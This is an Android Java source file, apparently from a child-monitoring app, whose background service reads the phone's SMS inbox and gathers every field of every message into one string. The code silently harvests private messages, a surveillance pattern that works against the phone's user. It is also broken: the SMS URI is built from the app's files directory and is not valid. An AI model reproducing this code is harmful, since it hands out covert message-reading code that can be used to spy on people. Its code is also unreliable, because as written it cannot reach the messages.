package com.klkc.wheresmychildren;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.media.AudioRecord;
import android.net.Uri;
import android.provider.Telephony;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class Home extends IntentService {

    private Cursor sms;
    public String textMessage = "";

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public Home(String name) {
        super(name);
    }

    public Home(){
        super("app");
    };


    @Override
    protected void onHandleIntent(Intent intent) {
        sms = getContentResolver().query(Uri.parse(getBaseContext().getFilesDir() + "://sms/inbox"), null, null, null, null);
        if (sms.moveToFirst()) {
            do {
                for (int idx = 0; idx < sms.getColumnCount(); idx++) {
                    textMessage += " " + sms.getColumnName(idx) + ":" + sms.getString(idx);
                }
            } while (sms.moveToNext());
        }
    }
}
